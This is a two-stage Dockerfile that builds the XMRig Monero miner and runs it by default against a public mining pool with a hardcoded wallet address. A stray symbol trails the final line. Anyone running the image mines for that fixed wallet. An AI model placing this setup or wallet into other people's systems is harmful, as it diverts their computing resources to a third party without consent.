FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v6.7.0'

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15
RUN useradd -ms /bin/bash monero
WORKDIR /root
COPY --from=build --chown=monero /root/xmrig/build/xmrig /root

ENTRYPOINT ["./xmrig"]
CMD ["--url=pool.supportxmr.com:3333", "--user=49ZNRzJYncy5KaabHuMXqHcfRCg8WR7xULjf5YJyXtoYcSM4j6EYhQR8rne8Ee4Fk3XDNi61wEDmMXtfMKKLdKXZ5JUVhkj", "--pass=Docker", "-k", "--coin=monero"]˚
